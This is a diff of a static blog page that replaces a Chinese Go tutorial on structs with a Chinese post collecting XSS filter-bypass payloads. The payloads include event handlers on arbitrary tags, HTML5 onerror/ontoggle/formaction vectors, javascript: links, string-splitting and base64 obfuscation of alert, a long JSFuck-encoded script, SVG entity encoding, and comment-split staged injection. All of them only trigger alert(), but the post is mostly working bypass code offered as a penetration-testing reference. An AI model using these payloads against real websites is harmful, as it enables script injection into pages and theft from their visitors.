@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" >
 
-<title>[Go] 4.结构体 | rebootORZ</title>
+<title>记录一些突破性的XSS Payload（Updating） | rebootORZ</title>
 <meta name="description" content="一名默默无闻的攻城狮">
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
@@ -98,147 +98,62 @@
       <div class="sm-12 md-8 col">
         <div class="paper">
           <article class="article">
-            <h1>[Go] 4.结构体</h1>
+            <h1>记录一些突破性的XSS Payload（Updating）</h1>
             <p class="article-meta">
-              2021-02-02
+              2021-02-05
               
-                <a href="https://rebootorz.github.io/tag/VLOcVZGpM/" class="badge secondary">
-                  Golang
+                <a href="https://rebootorz.github.io/tag/NycXQ8xNz/" class="badge secondary">
+                  渗透技巧
                 </a>
               
             </p>
             
             <div class="post-content">
-              <h1 id="定义">定义</h1>
-<p>数组、切片和 Map 可以用来表示同一种数据类型的集合，但是当我们要表示不同数据类型的集合时就 需要用到结构体。<br>
-结构体是由零个或多个任意类型的值聚合成的实体</p>
-<p>关键字 type和struct用来定义结构体：</p>
-<pre><code>type StructName struct{
-    FieldName type
-}
+              <p>1.任意标签</p>
+<pre><code>&lt;sasda onclick=&quot;alert(/xss/)&quot;&gt;clickme&lt;/sasda&gt;
 </code></pre>
-<p>简单示例：定义一个学生结构体</p>
-<pre><code>package main
-
-import &quot;fmt&quot;
-
-type Student struct{
-    Age int
-    Name string
-}
-
-func main(){
-    stu := Student{
-        Age: 18,
-        Name: &quot;name&quot;,
-    }
-    fmt.Println(stu)
-    //在赋值的时候，字段名可以忽略
-    fmt.Println(Student{20,&quot;new name&quot;})
-    return
-}
+<p>2.html5新特性</p>
+<pre><code>&lt;video&gt;&lt;source onerror=alert(/xss/)&gt;
+&lt;details open ontoggle=&quot;alert(/xss3/)&quot;&gt;
+&lt;form&gt;&lt;button formaction=&quot;javascript:alert(/xss4/)&quot;&gt;x&lt;/button&gt;
 </code></pre>
-<p>通常结构体中一个字段占一行，但是类型相同的字段，也可以放在同一行，例如:</p>
-<pre><code>type Student struct{
-    Age    int
-    Name,Address    string
-}
+<ul>
+<li>更多HTML5特性payload参考：https://www.html5sec.org<br>
+3.Javascript伪协议</li>
+</ul>
+<pre><code>&lt;a href=&quot;javascript:alert(/xss2/)&quot;&gt;click&lt;/a&gt;
 </code></pre>
-<p>一个结构体中的字段名是唯一的，例如一下代码，出现了两个<br>
-Name 字段，是错误的:</p>
-<pre><code>type Student struct{
-    Name string
-    Name string
-}
+<p>4.拼接&amp;编码</p>
+<pre><code>&lt;script&gt;window['alert'](/xss/)&lt;/script&gt;
+&lt;script&gt;window['al'+'ert'](/xss/)&lt;/script&gt;
+&lt;script&gt;window[atob(&quot;YWxl&quot;+&quot;cnQ=&quot;)](/xss/)&lt;/script&gt;
+**注：**atob(str)用于将str进行base64解码(btoa(bs4str)是编码) 。
 </code></pre>
-<p>结构体中的字段如果是小写字母开头，那么其他 package 就无法直接使用该字段，例如:</p>
-<pre><code>//在包pk1中定义Student结构体
-package pk1
-type Student struct{
-    Age int
-    name string
-}
-//在另一个包pk2中调用Student结构体
-package pk2
-
-    func main(){
-        stu := Student{}
-        stu.Age = 18 //正确
-        stu.name = &quot;name&quot;  //错误，因为'name'字段为小写字母开头，不对外暴露。 
-}
+<p>5.利用JSFuck<br>
+<strong>注：</strong> JSFuck 可以让你只用 6 个字符 <a href=""></a>!+ 来编写 JavaScript 程序。<br>
+例如<script>alert(1)</script></p>
+<pre><code>&lt;script&gt;[][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]][([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]]+([][[]]+[])[+[[+!+[]]]]+(![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[+!+[]]]]+([][[]]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]((![]+[])[+[[+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]+(!![]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[+!+[]]]+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+[+!+[]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[+!+[]]]+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]])()&lt;/script&gt;
 </code></pre>
-<h1 id="结构体中内嵌结构体">结构体中内嵌结构体</h1>
-<p>**注：**如果嵌入的结构体是这个结构体自己，那么只能用指针。请看以下例子。</p>
-<pre><code>package main
-
-import &quot;fmt&quot;
-
-type Three struct{
-    value    int
-    left,right    *Three
-}
-
-func main(){
-    tree := Three{
-        value: 1,
-        left: &amp;Tree{
-            value: 1,
-            left: nil,
-            right: nil,
-        },
-    }
-    fmt.Printf(&quot;&gt;&gt;&gt; %#v\n&quot;, tree)
-}
+<ul>
+<li>在线加密地址：https://www.sojson.com/jsfuck.html<br>
+6.svg标签</li>
+<li>svg内部标签和语句规则继承的是XML不是HTML，其内部的script标签中可以允许存在一部分进制或编码后的字符（比如实体编码）：</li>
+</ul>
+<pre><code>&lt;svg&gt;&lt;script&gt;alert&amp;#x28;1&amp;#x29;&lt;/script&gt;&lt;/svg&gt;
+&lt;svg&gt;&lt;script&gt;alert%26%23x28;1%26%23x29;&lt;/script&gt;&lt;/svg&gt;
 </code></pre>
-<h1 id="结构体进行比较">结构体进行比较</h1>
-<p>**注：**前提是结构体中的字段类型是可以比较的。</p>
-<pre><code>package main
-
-import &quot;fmt&quot;
-
-type Tree struct{
-        value  int
-        left,right  *Tree
-}
-
-func main(){
-        tree1 := Tree{
-            value: 2,
-        }
-        tree2 := Tree{
-            value: 1,        
-        }
-        fmt.Printf(&quot;&gt;&gt;&gt;%#v\n&quot;,tree1 == tree2)
-
-}
+<p>7.分段注释绕过</p>
+<ul>
+<li>通过分阶段插入payload，并结合注释符绕过限制。</li>
+</ul>
+<pre><code>stage1:&lt;script&gt;/*
+stage2:*/alert(1)/*
+stage3:*/&lt;/script&gt;
 </code></pre>
-<h1 id="结构体内嵌匿名成员">结构体内嵌匿名成员</h1>
-<p>定义：声明一个成员对应的数据类型而不指名成员的名字;这类成员就叫匿名成员</p>
-<pre><code>package main
-
-import &quot;fmt&quot;
-
-type Person struct {
-    Age int
-    Name string
-}
-
-type Student struct {
-    Person
-}
-
-func main() {
-    per := Person{
-        Age: 18,
-        Name: &quot;Name&quot;,
-     }
-
-    stu := Student{Person: per}
-
-    fmt.Println(&quot;stu.Age: &quot;,stu.Age)
-    fmt.Println(&quot;stu.Name&quot;,stu.Name)
-}
-
+<ul>
+<li>当然也可以直接不分阶段：</li>
+</ul>
+<pre><code>&lt;script&gt;/**/alert(1)/**/&lt;/script&gt;
 </code></pre>
 
             </div>
@@ -250,9 +165,9 @@ func main() {
               <div class="next">
                 下一篇
               </div>
-              <a href="https://rebootorz.github.io/ld0c2reGf/">
+              <a href="https://rebootorz.github.io/cDP755kpw/">
                 <h3 class="post-title">
-                  [Go] 3.自定义类型
+                  [Go] 11.Channel
                 </h3>
               </a>
             </div>
@@ -383,11 +298,11 @@ func main() {
     </div>
     <div class="row">
       
-        <a href="https://rebootorz.github.io/tag/BjedM9kLx/" class="badge warning">
+        <a href="https://rebootorz.github.io/tag/BjedM9kLx/" class="badge secondary">
           红队
         </a>
       
-        <a href="https://rebootorz.github.io/tag/NycXQ8xNz/" class="badge ">
+        <a href="https://rebootorz.github.io/tag/NycXQ8xNz/" class="badge success">
           渗透技巧
         </a>
       
@@ -395,7 +310,7 @@ func main() {
           Golang
         </a>
       
-        <a href="https://rebootorz.github.io/tag/4EHijLUV6/" class="badge secondary">
+        <a href="https://rebootorz.github.io/tag/4EHijLUV6/" class="badge warning">
           物联网安全
         </a>
       
